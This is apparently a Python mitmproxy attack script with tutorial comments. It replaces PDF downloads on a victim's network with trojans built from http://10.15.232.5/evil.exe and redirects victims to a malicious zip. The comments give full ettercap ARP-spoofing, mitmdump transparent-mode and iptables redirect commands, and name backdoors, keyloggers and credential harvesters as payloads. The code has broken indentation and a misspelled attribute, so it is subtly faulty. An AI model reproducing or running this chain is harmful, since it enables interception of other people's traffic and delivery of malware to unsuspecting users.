import mitmproxy
import subprocess

def request(flow):
    #code to handle request flows
    if flow.request.host != "10.15.232.5" and flow.request.pretty_url.endswith(".pdf"):
        print("[+] Got an intriguing flow")
          front_file = flow.request.pretty_url + "#"
            subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.15.232.5/evil.exe -o /var/www/html/file.exe# -i /root/Downloads/pdf.ico", shell=True)
            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
#----------------------------------------------------------------------------------------------------------------
#        Testing Script On A Remote Computer To Replace Downloads With a Trojan.
#
#            Now that we know how to create trojans and we have a working script that will replace downloads on the fly with any file that we want, lets test this script against a remote computer. We will start by running an ARP spoofing attack against the client computer
#            using Ettercap. (Note: we can use MTIMproxy whenever we are the man in the middle, hence it can be used with ARP spoofing attack, with Fake AP or rather with any other scenario. For convenience, we will use Ettercap to become
#            the man in the middle.)
#
#             ettercap -Tq -M arp:oneway -i wlan0 -S /10.15.232.1// /10.15.232.9//
#
#            (Note: the above command will silently execute an ARP poison attack using the interface wlan0 and the -S is so that it does not forge an SSL certificate.)
#            Next, we will run MITMproxy in a separate terminal window. So, first go into the working directory of MITMproxy and run the following.
#
#             ./mitmdump -s /root/proxyscript.py --transparent
#
#            (Note: since browser is not configured to run a proxy, we are going to use the transparent mode. Here -s is the location of my MITM python script.)
#            Next, we have to run an iptables command in a separate terminal window to redirect all data to port 8080 where MITMproxy is running, since all the client data is flowing to port 80 (which is my default web server port).
#
#             iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
#
#            So now when a client clicks on a pdf download, the download will get redirected and it will prompt the client to download our evil zip file. When the client unzips and opens the PDF, our evil file will get executed. (This evil file could be a backdoor,
#            a key logger, a credential harvester, etc.)
